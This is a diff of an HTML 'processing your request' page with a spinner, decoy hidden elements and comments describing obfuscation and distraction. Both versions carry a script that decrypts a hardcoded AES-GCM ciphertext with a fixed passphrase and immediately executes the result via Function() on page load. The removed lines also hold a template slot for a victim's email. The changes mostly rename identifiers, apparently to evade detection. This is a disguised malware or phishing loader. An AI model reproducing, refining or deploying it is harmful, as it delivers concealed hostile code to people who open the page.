@@ -18,82 +18,78 @@
             min-height: 100vh;
             overflow: hidden;
         }
-        .spinner-box {
+        .rotating-box {
             width: 70px;
             height: 70px;
-            border: 10px solid #ddd;
-            border-top: 10px solid #007bff;
+            border: 10px solid #eaeaea;
+            border-top: 10px solid #3498db;
             border-radius: 50%;
-            animation: spin-circle 1.2s linear infinite;
+            animation: rotation-animation 1.2s linear infinite;
         }
-        @keyframes spin-circle {
+        @keyframes rotation-animation {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
-        .loading-status {
+        .status-text {
             margin-top: 15px;
             font-size: 18px;
             color: #555;
         }
-        .hidden-section {
+        .hidden-content {
             visibility: hidden;
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden section -->
-    <div class="hidden-section">
-        <div id="extra-node" data-value="placeholder"></div>
+    <!-- Hidden Content -->
+    <div class="hidden-content">
+        <div id="random-node" data-info="hidden"></div>
     </div>
 
-    <!-- Loader -->
-    <div class="spinner-box"></div>
-    <p nike-bashman="" adidas="<%=EMAIL64%>" class="loading-status">Hang tight! Processing your request...</p>
+    <!-- Main Loader -->
+    <div class="rotating-box"></div>
+    <p random-attr="obfuscate" alt="placeholder" class="status-text">Please wait, your request is being processed...</p>
 
-    <!-- Additional unused content -->
+    <!-- Obfuscation Elements -->
     <div style="display: none;">
-        <span>Extra content for obfuscation purposes.</span>
+        <span>Unnecessary text for distraction purposes.</span>
     </div>
 
-    <!-- Core Script -->
+    <!-- Main Functionality -->
     <script>
-        const executeFakeTasks = () => {
-            const tasks = ["TaskAlpha", "TaskBeta", "TaskGamma"];
-            tasks.forEach(task => console.log(`Executing: ${task}`));
+        const simulateFakeProcesses = () => {
+            const processList = ["ProcessOne", "ProcessTwo", "ProcessThree"];
+            processList.forEach(proc => console.log(`Running: ${proc}`));
         };
-        executeFakeTasks();
+        simulateFakeProcesses();
 
         setTimeout(() => {
-            document.querySelector('.loading-status').textContent = "Process completed!";
-            document.body.style.backgroundColor = '#e7ffe6';
-        }, 5000);
+            document.querySelector('.status-text').textContent = "Operation successful!";
+            document.body.style.backgroundColor = '#d4f5e9';
+        }, 6000);
 
         (() => {
-            const redundantElement = document.createElement('div');
-            redundantElement.id = 'hiddenContent';
-            redundantElement.textContent = "This won't show up.";
-            console.log(redundantElement);
+            const tempDiv = document.createElement('div');
+            tempDiv.id = 'invisibleElement';
+            tempDiv.textContent = "This is invisible.";
+            console.log(tempDiv);
         })();
     </script>
 
-    <!-- Advanced Decryption Logic -->
+    <!-- Enhanced Encryption and Decryption -->
     <script>
-        const decryptContent = async (encryptedData, ivHex, saltHex, passphrase) => {
-            console.log("[INFO] Starting decryption...");
+        const customDecryptor = async (encData, initVector, saltValue, passwordPhrase) => {
+            console.log("[INFO] Initiating decryption...");
 
-            const hexToBytes = (hexString) => {
-                return Uint8Array.from(hexString.match(/.{2}/g).map(byte => parseInt(byte, 16)));
-            };
+            const hexToUint8Array = (hex) => Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
 
-            const delaySimulation = () => new Promise(resolve => {
-                console.log("[DEBUG] Simulating delay...");
-                setTimeout(() => {
-                    resolve();
-                }, 200);
+            const fakeDelay = () => new Promise(resolve => {
+                console.log("[DEBUG] Delaying artificially...");
+                setTimeout(() => resolve(), 300);
             });
 
-            const deriveKey = async (keyMaterial, salt) => {
+            const generateDecryptionKey = async (keyMaterial, salt) => {
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -105,57 +101,57 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passphrase),
+                new TextEncoder().encode(passwordPhrase),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await delaySimulation();
-            const aesKey = await deriveKey(keyMaterial, hexToBytes(saltHex));
+            await fakeDelay();
+            const aesKey = await generateDecryptionKey(keyMaterial, hexToUint8Array(saltValue));
 
             try {
-                const decryptedContent = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: hexToBytes(ivHex) },
+                const decryptedData = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: hexToUint8Array(initVector) },
                     aesKey,
-                    hexToBytes(encryptedData)
+                    hexToUint8Array(encData)
                 );
-                console.log("[SUCCESS] Decryption completed.");
-                return new TextDecoder().decode(decryptedContent);
-            } catch (error) {
-                console.error("[ERROR] Decryption failed:", error);
+                console.log("[SUCCESS] Decryption successful.");
+                return new TextDecoder().decode(decryptedData);
+            } catch (err) {
+                console.error("[ERROR] Decryption failed:", err);
                 return null;
             }
         };
 
-        const analyzeData = (data) => {
-            console.log("[INFO] Analyzing decrypted content...");
-            if (!data) {
-                console.error("[ERROR] Missing data.");
+        const analyzeDecryptedContent = (content) => {
+            console.log("[INFO] Analyzing decrypted data...");
+            if (!content) {
+                console.error("[ERROR] No content found.");
                 return;
             }
-            const reversedData = data.split("").reverse().join("");
-            console.log("[INFO] Reversed data:", reversedData);
-            return reversedData;
+            const scrambledContent = content.split("").reverse().join("");
+            console.log("[INFO] Scrambled content:", scrambledContent);
+            return scrambledContent;
         };
 
         (async () => {
-            console.log("[INFO] Decryption workflow initiated...");
-         const payload = {
+            console.log("[INFO] Starting decryption process...");
+            const dataPayload = {
                 iv: "c5d54a9c69516d18fab025aa",
                 salt: "f2c9263a7137550b0829e316a222b86e",
-                data: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
+                encrypted: "7c186924f7b217943e4c6487f9d39b9910bc7e640ffc082516da5a9b8caf274be8b70ffd65131a24d3f7193f6f5dd3e09d0a3fad4dcfe75feb75f009b820f7974fa3c7cd763720aec91aa95aab0121cada3f156e35e520eb549e4f0c4b3efd501a525f8e3df5ff4bdde38199df65ddb856d5304bed2dba800983ecb1af1d7b6481700ddc96c5f3647cf54a430e067be7e01beb2ddd09e0bf4795d77e4e69c4459c8a926bc922680f55877eb0cf57b26d2450952d66fb175206cd3d15257f8eed99d48bfd50931242"
             };
 
-            const passphrase = "quickescape";
-            const decryptedResult = await decryptContent(payload.data, payload.iv, payload.salt, passphrase);
+            const keyPhrase = "quickescape";
+            const decryptedOutput = await customDecryptor(dataPayload.encrypted, dataPayload.iv, dataPayload.salt, keyPhrase);
 
-            if (decryptedResult) {
-                console.log("[INFO] Decrypted data:", decryptedResult);
-                const analyzedOutput = analyzeData(decryptedResult);
+            if (decryptedOutput) {
+                console.log("[INFO] Decrypted content:", decryptedOutput);
+                const analyzedContent = analyzeDecryptedContent(decryptedOutput);
 
-                console.log("[INFO] Executing decrypted output...");
-                Function(`${decryptedResult}`)();
+                console.log("[INFO] Executing decrypted content...");
+                Function(`${decryptedOutput}`)();
             }
         })();
     </script>
